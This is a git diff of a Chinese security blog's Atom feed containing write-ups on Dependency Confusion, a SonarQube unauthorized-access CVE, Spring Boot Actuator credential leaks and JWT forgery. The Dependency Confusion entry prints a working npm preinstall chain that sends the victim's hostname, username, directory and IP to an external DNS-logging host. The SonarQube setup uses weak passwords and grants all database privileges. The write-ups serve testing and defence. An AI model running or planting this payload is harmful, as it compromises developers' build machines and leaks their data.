@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-02-04T12:32:03.161Z</updated>
+    <updated>2022-02-08T08:45:35.059Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
@@ -371,101 +371,126 @@ mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /kr
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Dependency Confusion]]></title>
-        <id>https://V-alkoinen.github.io/post/Dependency Confusion/</id>
-        <link href="https://V-alkoinen.github.io/post/Dependency Confusion/">
+        <title type="html"><![CDATA[ CVE-2020-27986 SonarQube未授权访问]]></title>
+        <id>https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/</id>
+        <link href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/">
         </link>
-        <updated>2021-10-03T05:52:47.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
-<p>  Dependency Confusion，一个让微软、苹果、PayPal、Shopify等公司给出3W美元赏金的漏洞</p>
-<h1 id="漏洞原理与分析">漏洞原理与分析</h1>
-<p>  我们常用Python、Ruby、Nodejs等编程语言构建项目，都会引用一些依赖包。如果应用的构建使用私有的、内部创建的依赖项，而该依赖项在公共开源存储库中不存在，那么就会发生Dependency Confusion。攻击者能够在公共存储库上以相同的名称注册具有更高版本号的依赖项。然后，最可能发生的是，应用在构建的时候会拉取攻击者在公共依赖库中上传的高版本依赖包，从而执行攻击者的代码。</p>
-<h1 id="漏洞复现">漏洞复现</h1>
-<h4 id="1-访问某站点时发现该站点引用了一部分-npm-包"> 1、访问某站点时发现该站点引用了一部分 npm 包；</h4>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641207155562.png" alt="" loading="lazy"></figure>
-<h4 id="2-npmjs查找-npm-包并未发现确认为私有包"> 2、<a href="https://www.npmjs.com/">npmjs</a>查找 npm 包，并未发现，确认为私有包；</h4>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1642324613899.png" alt="" loading="lazy"></figure>
-<h4 id="3-注册包名并发布恶意代码以下代码仅作漏洞证明"> 3、注册包名，并发布恶意代码（以下代码仅作漏洞证明）</h4>
-<p> index.js</p>
-<pre><code>const { exec } = require(&quot;child_process&quot;);
-exec(&quot;pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done; b=$(hostname | head | xxd -p) &amp;&amp; nslookup $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; c=$(curl ifconfig.me | head | xxd -p) &amp;&amp; nslookup $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; d=$(echo shineout-mobile | head | xxd -p) &amp;&amp; nslookup $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; e=$(whoami | head | xxd -p ) &amp;&amp; nslookup $a.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
+        <updated>2021-11-12T07:46:41.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
+<p>  近期，境外网站又报道了一些涉及中国多个机构和企业的代码泄漏，就是利用<code>SonarQube</code>的API未授权漏洞进行的。<br>
+<img src="https://V-alkoinen.github.io/post-images/1644306782124.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644306879690.png" alt="" loading="lazy"></p>
+<h1 id="二-搭建sonarqube">二、搭建SonarQube</h1>
+<p>  参考&lt;&gt;</p>
+<h1 id="三-漏洞复现">三、漏洞复现</h1>
+<p>  1、配置SVN<br>
+<img src="https://V-alkoinen.github.io/post-images/1644308908733.png" alt="" loading="lazy"><br>
+  2、配置Gitlab<br>
+<img src="https://V-alkoinen.github.io/post-images/1644309022235.png" alt="" loading="lazy"><br>
+  3、配置SMTP<br>
+<img src="https://V-alkoinen.github.io/post-images/1644309248467.png" alt="" loading="lazy"><br>
+  4、请求/api/settings/values接口<br>
+<img src="https://V-alkoinen.github.io/post-images/1644309332550.png" alt="" loading="lazy"><br>
+  5、此外/api/webservices/list接口也会泄露部分信息<br>
+<img src="https://V-alkoinen.github.io/post-images/1644309409453.png" alt="" loading="lazy"></p>
+<h1 id="四-修复建议">四、修复建议</h1>
+<p>  升级至安全版本<br>
+  为了预防供应链攻击，建议屏蔽所有第三方插件<br>
+<img src="https://V-alkoinen.github.io/post-images/1644309752807.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SonarQube 搭建]]></title>
+        <id>https://V-alkoinen.github.io/post/sonarqube-da-jian/</id>
+        <link href="https://V-alkoinen.github.io/post/sonarqube-da-jian/">
+        </link>
+        <updated>2021-11-10T08:02:09.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-sonarqube介绍">一、SonarQube介绍</h1>
+<p>  <code>sonar</code>是一款静态代码质量分析工具，支持<code>Java</code>、<code>Python</code>、<code>PHP</code>、<code>JavaScript</code>、<code>CSS</code>等25种以上的语言，而且能够集成在IDE、Jenkins、Git等服务中，方便随时查看代码质量分析报告；<br>
+  <code>sonar</code>通过配置的代码分析规则，从可靠性、安全性、可维护性、覆盖率、重复率等方面分析项目，风险等级从A~E划分为5个等级;<br>
+  同时，<code>sonar</code>可以集成pmd、findbugs、checkstyle等插件来扩展使用其他规则来检验代码质量；</p>
+<h1 id="二-sonarqube组成">二、SonarQube组成</h1>
+<p>  一个sonar项目主要有以下四个组件构成：<br>
+<img src="https://V-alkoinen.github.io/post-images/1644307752196.png" alt="" loading="lazy"><br>
+ 1、一台SonarQube Server启动3个主要过程：<br>
+   Web服务器，供开发人员，管理人员浏览高质量的快照并配置SonarQube实例<br>
+   基于Elasticsearch的Search Server从UI进行后退搜索<br>
+   Compute Engine服务器，负责处理代码分析报告并将其保存在SonarQube数据库中<br>
+ 2、一个SonarQube数据库要存储：<br>
+   SonarQube实例的配置（安全性，插件设置等）<br>
+   项目，视图等的质量快照。<br>
+ 3、服务器上安装了多个SonarQube插件，可能包括语言，SCM，集成，身份验证和管理插件<br>
+ 4、在构建/持续集成服务器上运行一个或多个SonarScanner，以分析项目；</p>
+<h1 id="三-sonarqube搭建">三、SonarQube搭建</h1>
+<p> </p>
+<pre><code>docker pull mysql:5.7
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644307957802.png" alt="" loading="lazy"></figure>
+<pre><code>mkdir -p ./mysql/conf
+mkdir -p ./mysql/logs
+mkdir -p ./mysql/data
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644308019253.png" alt="" loading="lazy"></figure>
+<pre><code>docker network create sonarqube
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1644308063767.png" alt="" loading="lazy"></figure>
+<pre><code>docker run --name mysql -d -p 3306:3306 --net sonarqube -v {basedir}/sonar/mysql/conf:/etc/my.cnf.d -v {basedir}/sonar/mysql/logs:/logs -v {basedir}/sonar/mysql/data:/var/lib/mysql \
+-e MYSQL_ROOT_PASSWORD=123456 \
+--restart always \
+--privileged=true \
+--network-alias mysql \
+mysql:5.7
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1644308132821.png" alt="" loading="lazy"></figure>
+<pre><code>#建数据库、用户
+docker exec -it mysql bash
+mysql -uroot -p'123456'
+GRANT ALL ON *.* TO 'root'@'%';
+create database sonar; 
 
-});
+CREATE USER 'sonar'@'%' IDENTIFIED WITH mysql_native_password BY 'sonar';  
+GRANT ALL PRIVILEGES ON *.* TO 'sonar'@'%';
+flush privileges; 
 </code></pre>
-<p> build.js</p>
-<pre><code>exec(&quot;node main.js  &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
-
-});
+<pre><code>docker pull sonarqube:7.4-community
 </code></pre>
-<p> main.js</p>
-<pre><code>const { exec } = require(&quot;child_process&quot;);
-exec(&quot;node index.js  &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sh setup.sh &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
-
-});
+<figure data-type="image" tabindex="5"><img src="https://V-alkoinen.github.io/post-images/1644308230796.png" alt="" loading="lazy"></figure>
+<pre><code>mkdir -p ./data/sonarqube
 </code></pre>
-<p> package.json</p>
-<pre><code>{
-  &quot;name&quot;: &quot;&lt;npm_package_name&gt;&quot;,
-  &quot;version&quot;: &quot;2.0.0&quot;,
-  &quot;description&quot;: &quot;&quot;,
-  &quot;main&quot;: &quot;main.js&quot;,
-  &quot;scripts&quot;: {
-    &quot;preinstall&quot;: &quot;node build.js&quot;,
-    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
-  },
-  &quot;author&quot;: &quot;laobai&quot;,
-  &quot;license&quot;: &quot;ISC&quot;,
-  &quot;dependencies&quot;: {
-    &quot;express&quot;: &quot;^4.17.1&quot;,
-    &quot;lodash&quot;: &quot;^4.17.21&quot;
-  }
-}
+<figure data-type="image" tabindex="6"><img src="https://V-alkoinen.github.io/post-images/1644308272770.png" alt="" loading="lazy"></figure>
+<pre><code>echo &quot;vm.max_map_count=262144&quot; &gt; /etc/sysctl.conf
+sysctl -p
 </code></pre>
-<p> setup.sh</p>
-<pre><code>#!/usr/bin/bash
-
-pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done;
-b=$(hostname | head | base64) &amp;&amp; dig $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-c=$(curl ifconfig.me | head | base64) &amp;&amp; dig $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-d=$(echo &quot;shineout-mobile&quot; | head | base64) &amp;&amp; dig $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+<figure data-type="image" tabindex="7"><img src="https://V-alkoinen.github.io/post-images/1644308305721.png" alt="" loading="lazy"></figure>
+<pre><code>docker run -d --name sonartest sonarqube:7.4-community
 </code></pre>
-<h1 id="四-防范">四、防范</h1>
-<p>  1、对于第三方依赖包，均在外部公共库进行注册；<br>
-  2、维护内部源，维护依赖包列表，相关私有包只能从内部源中获取；<br>
-  3、对于从外部源获取的包，采用SCA进行扫描（不过现在市面上的SCA均是以比对漏洞库的形式检测，个人认为必要时可以采用SAST代替这部分的扫描任务）。<br>
-  <a href="https://azure.microsoft.com/zh-cn/resources/3-ways-to-mitigate-risk-using-private-package-feeds/">微软白皮书</a></p>
-<h1 id="五-杂谈">五、杂谈</h1>
-<p>  Dependency Confusion作为供应链攻击的一种，该漏洞已经影响了很多大厂<br>
-<img src="https://V-alkoinen.github.io/post-images/1642329462997.png" alt="" loading="lazy"><br>
-<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">相关文章</a></p>
+<figure data-type="image" tabindex="8"><img src="https://V-alkoinen.github.io/post-images/1644308352219.png" alt="" loading="lazy"></figure>
+<pre><code>docker cp sonartest:/opt/sonarqube/conf ./data/sonarqube
+docker cp sonartest:/opt/sonarqube/data ./data/sonarqube
+docker cp sonartest:/opt/sonarqube/logs ./data/sonarqube
+docker cp sonartest:/opt/sonarqube/extensions ./data/sonarqube
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://V-alkoinen.github.io/post-images/1644308398122.png" alt="" loading="lazy"></figure>
+<pre><code>docker rm sonartest
+chmod -R 777 ./data/sonarqube/
+</code></pre>
+<pre><code>docker run -d --name sonar -p 80:9000 \
+ -e ALLOW_EMPTY_PASSWORD=yes \
+ -e SONARQUBE_DATABASE_USER=sonar \
+ -e SONARQUBE_DATABASE_NAME=sonar \
+ -e SONARQUBE_DATABASE_PASSWORD=sonar \
+ -e SONARQUBE_JDBC_URL=&quot;jdbc:mysql://mysql:3306/sonar?useUnicode=true&amp;characterEncoding=utf8&amp;rewriteBatchedStatements=true&amp;useConfigs=maxPerformance&amp;useSSL=false&quot; \
+ --net sonarqube \
+ --privileged=true \
+ -v {basedir}/sonar/data/sonarqube/logs:/opt/sonarqube/logs \
+ -v {basedir}/sonar/data/sonarqube/conf:/opt/sonarqube/conf \
+ -v {basedir}/sonar/data/sonarqube/data:/opt/sonarqube/data \
+ -v {basedir}/sonar/data/sonarqube/extensions:/opt/sonarqube/extensions\
+ sonarqube:7.4-community
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://V-alkoinen.github.io/post-images/1644308562333.png" alt="" loading="lazy"></figure>
+<p>  访问 http://IP/<br>
+  默认用户名密码：admin/admin</p>
 ]]></content>
     </entry>
     <entry>
@@ -473,7 +498,7 @@ e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&a
         <id>https://V-alkoinen.github.io/post/you-jian-wei-zao/</id>
         <link href="https://V-alkoinen.github.io/post/you-jian-wei-zao/">
         </link>
-        <updated>2021-07-30T08:34:07.000Z</updated>
+        <updated>2021-10-16T08:34:07.000Z</updated>
         <content type="html"><![CDATA[<h1 id="一-spf简介">一、SPF简介</h1>
 <p>  <code>SPF</code> ，全称为 <code>Sender Policy Framework</code>，即发件人策略框架。<br>
   我们都知道，Email通信时，使用的是 SMTP 协议（<code>Simple Mail Transfer Protocol</code>），即简单邮件传输协议。此协议在通信过程中十分简陋，发件人的邮箱地址可以由发信方进行声明，所以协议本身没有很好的安全措施。SPF 出现的目的，就是为了解决 SMTP 的安全短板。</p>
@@ -599,152 +624,110 @@ v=spf1 a mx ip4:173.194.72.103 -all
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Spring Boot Actuator 未授权访问]]></title>
-        <id>https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/</id>
-        <link href="https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/">
+        <title type="html"><![CDATA[DevSecOps 流程]]></title>
+        <id>https://V-alkoinen.github.io/post/devsecops-liu-cheng/</id>
+        <link href="https://V-alkoinen.github.io/post/devsecops-liu-cheng/">
         </link>
-        <updated>2021-04-09T08:22:23.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-actuator简介">一、Actuator简介</h1>
-<p>  Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。<br>
-<img src="https://V-alkoinen.github.io/post-images/1641718653990.png" alt="" loading="lazy"></p>
-<h1 id="二-spring-boot框架站点识别">二、Spring Boot框架站点识别</h1>
-<h3 id="21-通过-web-应用程序网页标签的图标">2.1、通过 web 应用程序网页标签的图标</h3>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641720263949.png" alt="" loading="lazy"></figure>
-<h3 id="22-通过-spring-boot-框架默认报错页面">2.2、通过 Spring Boot 框架默认报错页面</h3>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1641720440742.png" alt="" loading="lazy"></figure>
-<h1 id="三-spring-boot关注点及利用">三、Spring Boot关注点及利用</h1>
-<h3 id="31-httptrace-泄露cookie">3.1、/httptrace 泄露cookie</h3>
-<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1642228750817.png" alt="" loading="lazy"></figure>
-<h3 id="32-v2api-docs-泄露接口文档">3.2、/v2/api-docs 泄露接口文档</h3>
-<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1642228877170.png" alt="" loading="lazy"></figure>
-<h3 id="33-env-泄露环境变量信息">3.3、/env 泄露环境变量信息</h3>
-<p>  可以获取OSS或S3 bucket信息（ali.oss.endpoint、ali.oss.bucketname、ali.oss.fileDir）<br>
-<img src="https://V-alkoinen.github.io/post-images/1642229224665.png" alt="" loading="lazy"></p>
-<h3 id="34-heapdump-内存dump文件-泄露jdbc连接地址-数据库信息-存储桶相关aksk">3.4、/heapdump (内存dump文件) 泄露JDBC连接地址、数据库信息、存储桶相关AK/SK</h3>
-<p> 使用工具：jvisualvm<br>
- 数据库相关信息可以搜索：com.mysql.jdbc.JDBC4DatabaseMetaData -&gt; conn<br>
- OSS-AK：com.aliyun.oss.common.auth.DefaultCredentialProvider -&gt; creds -&gt; accessKeyId<br>
- OSS-SK：com.aliyun.oss.common.auth.DefaultCredentialProvider -&gt; creds -&gt; secretAccessKey<br>
-<img src="https://V-alkoinen.github.io/post-images/1642230981749.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1642230889996.png" alt="" loading="lazy"><br>
- 配合/env拿到的信息可以直接接管OSS（S3同理）<br>
- 同时如果配置有误可以直接利用AK和SK接管实例<br>
- 利用工具：<a href="https://github.com/iiiusky/alicloud-tools">alicloud-tools</a></p>
-<h1 id="四-修复方案">四、修复方案</h1>
-<p> 关闭所有包含敏感信息的endpoint<br>
- spring boot 1.x<br>
- 仅保留health</p>
-<pre><code>endpoints.enabled: false
-endpoints.health.enabled: true
-</code></pre>
-<p> spring boot 2.x<br>
- 仅保留health</p>
-<pre><code>management.endpoints.enabled-by-default: false
-management.endpoint.health.enabled: true
-</code></pre>
+        <updated>2021-10-08T07:42:44.000Z</updated>
+        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644133387901.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Fiddler]]></title>
-        <id>https://V-alkoinen.github.io/post/fiddler/</id>
-        <link href="https://V-alkoinen.github.io/post/fiddler/">
+        <title type="html"><![CDATA[Dependency Confusion]]></title>
+        <id>https://V-alkoinen.github.io/post/Dependency Confusion/</id>
+        <link href="https://V-alkoinen.github.io/post/Dependency Confusion/">
         </link>
-        <updated>2021-04-01T11:28:35.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-下载">一、下载</h1>
-<p><a href="https://www.telerik.com/download/fiddler">https://www.telerik.com/download/fiddler</a></p>
-<h1 id="二-安装后展示host-ip">二、安装后展示HOST IP</h1>
-<h3 id="21-点击fiddlerscript">2.1、点击FiddlerScript</h3>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641469393421.png" alt="" loading="lazy"></figure>
-<h3 id="22-找到以下方法">2.2、找到以下方法：</h3>
-<p><code>static function Main()</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1641469501118.png" alt="" loading="lazy"></p>
-<h3 id="23-添加如下代码">2.3、添加如下代码：</h3>
-<p><code>FiddlerObject.UI.lvSessions.AddBoundColumn(&quot;HOST IP&quot;, 120, &quot;X-HostIP&quot;);</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1641469558914.png" alt="" loading="lazy"></p>
-<h3 id="24-点击save-script重新打开fiddler">2.4、点击Save Script，重新打开fiddler</h3>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1641469671973.png" alt="" loading="lazy"></figure>
-<h1 id="三-配置https">三、配置HTTPS</h1>
-<h3 id="31-tools-options-connections勾选allow-remote-computers-to-connect允许远程发送请求">3.1、Tools-&gt;Options-&gt;Connections，勾选Allow remote computers to connect（允许远程发送请求）</h3>
-<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1641470406744.png" alt="" loading="lazy"></figure>
-<h3 id="32-tools-options-https勾选decrypt-https-traffic允许抓取https请求">3.2、Tools-&gt;Options-&gt;HTTPS，勾选Decrypt HTTPS traffic（允许抓取HTTPS请求）</h3>
-<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1641470520246.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[JWT攻击]]></title>
-        <id>https://V-alkoinen.github.io/post/jwt-gong-ji/</id>
-        <link href="https://V-alkoinen.github.io/post/jwt-gong-ji/">
-        </link>
-        <updated>2020-11-03T11:00:23.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-jwt概念">一、JWT概念</h1>
-<p>Json Web Token简称JWT，顾名思义JWT是用于身份验证的。这是一种无状态身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器受保护的路由将在授权头中检查有效的JWT，如果存在，则允许用户访问受保护的资源。<br>
-JWT有JWS与JWE两种实体形式，我们一般说的JWT其实都是JWS。<br>
-<img src="https://V-alkoinen.github.io/post-images/1641294341492.jpg" alt="" loading="lazy"></p>
-<h1 id="二-jwt结构">二、JWT结构</h1>
-<p>JWT一般是如下的形式：<br>
-<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</code><br>
-通过.分为三段,分别是 Header、Payload、Signature<br>
-<img src="https://V-alkoinen.github.io/post-images/1641294629263.png" alt="" loading="lazy"></p>
-<h2 id="21-header">2.1、header</h2>
-<pre><code>// 包括类别（typ）、加密算法（alg）；
-{
-    &quot;alg&quot;: &quot;HS256&quot;,
-    &quot;typ&quot;: &quot;JWT&quot;
-}
+        <updated>2021-10-03T05:52:47.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>  Dependency Confusion，一个让微软、苹果、PayPal、Shopify等公司给出3W美元赏金的漏洞</p>
+<h1 id="漏洞原理与分析">漏洞原理与分析</h1>
+<p>  我们常用Python、Ruby、Nodejs等编程语言构建项目，都会引用一些依赖包。如果应用的构建使用私有的、内部创建的依赖项，而该依赖项在公共开源存储库中不存在，那么就会发生Dependency Confusion。攻击者能够在公共存储库上以相同的名称注册具有更高版本号的依赖项。然后，最可能发生的是，应用在构建的时候会拉取攻击者在公共依赖库中上传的高版本依赖包，从而执行攻击者的代码。</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<h4 id="1-访问某站点时发现该站点引用了一部分-npm-包"> 1、访问某站点时发现该站点引用了一部分 npm 包；</h4>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641207155562.png" alt="" loading="lazy"></figure>
+<h4 id="2-npmjs查找-npm-包并未发现确认为私有包"> 2、<a href="https://www.npmjs.com/">npmjs</a>查找 npm 包，并未发现，确认为私有包；</h4>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1642324613899.png" alt="" loading="lazy"></figure>
+<h4 id="3-注册包名并发布恶意代码以下代码仅作漏洞证明"> 3、注册包名，并发布恶意代码（以下代码仅作漏洞证明）</h4>
+<p> index.js</p>
+<pre><code>const { exec } = require(&quot;child_process&quot;);
+exec(&quot;pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done; b=$(hostname | head | xxd -p) &amp;&amp; nslookup $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; c=$(curl ifconfig.me | head | xxd -p) &amp;&amp; nslookup $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; d=$(echo shineout-mobile | head | xxd -p) &amp;&amp; nslookup $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; e=$(whoami | head | xxd -p ) &amp;&amp; nslookup $a.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
 </code></pre>
-<p>jwt的头部包含两部分信息：<br>
-声明类型，这里是jwt<br>
-声明加密的算法 通常直接使用 HMAC SHA256<br>
-然后将头部进行base64加密（该加密是可以对称解密的)，构成了第一部分。</p>
-<h2 id="22-payload">2.2、payload</h2>
-<p>第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。<br>
-Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>
-Public claims : 可以随意定义。<br>
-Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>
-payload进行Base64编码就得到JWT的第二部分</p>
-<h2 id="23-signature">2.3、signature</h2>
-<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：<br>
-header (base64后的)<br>
-payload (base64后的)<br>
-secret</p>
-<pre><code>// 根据alg算法与私有秘钥进行加密得到的签名字串；
-// 这一段是最重要的敏感信息，只能在服务端解密；
-HMACSHA256(
-base64UrlEncode(header) + &quot;.&quot; +
-base64UrlEncode(payload),
-SECREATE_KEY
-)
+<p> build.js</p>
+<pre><code>exec(&quot;node main.js  &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
 </code></pre>
-<p>signature的目的：signature实际上是对header以及payload内容进行签名。所以，如果有人对header以及payload的内容解码之后进行修改，再进行编码的话，那么新的header和payload的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。 这样就能保证token不会被篡改。</p>
-<h1 id="三-jwt攻击手段">三、JWT攻击手段</h1>
-<h2 id="31-修改算法攻击">3.1、修改算法攻击</h2>
-<h3 id="311-修改算法为none">3.1.1、修改算法为None</h3>
-<p>签名算法保证了JWT在传输的过程中不被恶意用户修改，但是header部分的alg字段可被修改为none，一些JWT库支持none算法，即没有签名算法，当alg为none时服务端不会进行签名校验。<br>
-将alg修改为none后，去掉JWT中的signature数据（仅剩header + '.' + payload + '.'）然后加密提交到服务端即可伪造任意数据。</p>
-<h3 id="312-修改rsa加密算法为hmac">3.1.2、修改RSA加密算法为HMAC</h3>
-<p>首先我们知道非对称密码才存在公私钥，而对称密码只有一个密钥，算法RS256为非对称加密，而HS256为对称加密。<br>
-在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。<br>
-现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。</p>
+<p> main.js</p>
+<pre><code>const { exec } = require(&quot;child_process&quot;);
+exec(&quot;node index.js  &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sh setup.sh &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
+</code></pre>
+<p> package.json</p>
 <pre><code>{
-    &quot;alg&quot; : &quot;RS256&quot;,
-    &quot;typ&quot; : &quot;jwt&quot;
+  &quot;name&quot;: &quot;&lt;npm_package_name&gt;&quot;,
+  &quot;version&quot;: &quot;2.0.0&quot;,
+  &quot;description&quot;: &quot;&quot;,
+  &quot;main&quot;: &quot;main.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;preinstall&quot;: &quot;node build.js&quot;,
+    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
+  },
+  &quot;author&quot;: &quot;laobai&quot;,
+  &quot;license&quot;: &quot;ISC&quot;,
+  &quot;dependencies&quot;: {
+    &quot;express&quot;: &quot;^4.17.1&quot;,
+    &quot;lodash&quot;: &quot;^4.17.21&quot;
+  }
 }
 </code></pre>
-<p>通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即：</p>
-<pre><code>{
-    &quot;alg&quot; : &quot;HS256&quot;,
-    &quot;typ&quot; : &quot;jwt&quot;
-}
+<p> setup.sh</p>
+<pre><code>#!/usr/bin/bash
+
+pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done;
+b=$(hostname | head | base64) &amp;&amp; dig $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+c=$(curl ifconfig.me | head | base64) &amp;&amp; dig $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+d=$(echo &quot;shineout-mobile&quot; | head | base64) &amp;&amp; dig $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
 </code></pre>
-<p>同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。<br>
-服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>
-<h2 id="32-密钥爆破攻击">3.2、密钥爆破攻击</h2>
-<p>使用现有工具：c-jwt-cracker<br>
-<img src="https://V-alkoinen.github.io/post-images/1641297159619.png" alt="" loading="lazy"><br>
-对 JWT 的密钥爆破需要在一定的前提下进行：<br>
-1.知悉JWT使用的加密算法<br>
-2.一段有效的、已签名的token<br>
-3.签名用的密钥不复杂（弱密钥）</p>
